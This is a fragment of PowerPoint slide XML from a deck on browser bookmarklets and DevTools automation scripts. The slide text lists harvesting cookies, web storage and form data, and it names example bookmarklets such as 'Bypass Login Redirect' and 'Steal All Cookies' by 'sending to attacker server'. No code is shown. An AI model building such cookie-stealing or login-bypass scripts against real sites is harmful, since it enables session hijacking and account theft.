            <a:ext cx="13243084" cy="2376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Captures timestamp, URL, domain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Harvests cookies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Harvests localStorage and sessionStorage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Counts DOM elements (forms, inputs)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Extracts resource URLs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Collects page metadata (title, scripts, stylesheets)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Extracts form data with field details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Logs and returns the collected data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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253" y="775573"/>
            <a:ext cx="6252805" cy="61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10.1 Creating Bookmarklets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253" y="1464707"/>
            <a:ext cx="4326255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Automation &amp; DevTools Scripts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253" y="2096691"/>
            <a:ext cx="13241893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are Bookmarklets?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4253" y="2589252"/>
            <a:ext cx="13241893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Bookmarklets are JavaScript code saved as browser bookmarks that execute when clicked.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4253" y="3146822"/>
            <a:ext cx="3388519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Creating a Bookmarklet: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4253" y="3778806"/>
            <a:ext cx="13241893" cy="89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DevTools Console - Press F12 → Console tab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Write JavaScript Code - Include example of extracting all links and downloading as JSON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Save as Bookmark - Copy code, create new bookmark, paste code as URL with javascript: prefix, name and save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4253" y="4931334"/>
            <a:ext cx="330910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Example Bookmarklets:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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548" y="5569390"/>
            <a:ext cx="297537" cy="2975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8858" y="5563318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All Emails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338858" y="5977298"/>
            <a:ext cx="586787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 regex pattern</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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7842" y="5569390"/>
            <a:ext cx="297537" cy="2975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68151" y="5563318"/>
            <a:ext cx="314872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Extract All Phone Numbers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8068151" y="5977298"/>
            <a:ext cx="586799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 regex pattern</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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548" y="6627617"/>
            <a:ext cx="297537" cy="2975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38858" y="6621545"/>
            <a:ext cx="2569369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Bypass Login Redirect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338858" y="7035525"/>
            <a:ext cx="586787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setting sessionStorage and localStorage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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7842" y="6627617"/>
            <a:ext cx="297537" cy="2975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68151" y="662154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Steal All Cookies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8068151" y="7035525"/>
            <a:ext cx="5867995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sending to attacker server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9021</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>1282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Arial</vt:lpstr>
      <vt:lpstr>Instrument Sans Semi Bold</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Instrument Sans Light</vt:lpstr>
      <vt:lpstr>Instrument Sans Medium</vt:lpstr>
      <vt:lpstr>Consolas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3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-02-09T08:31:12Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-09T09:21:15Z</dcterms:modified>
</cp:coreProperties>
</file>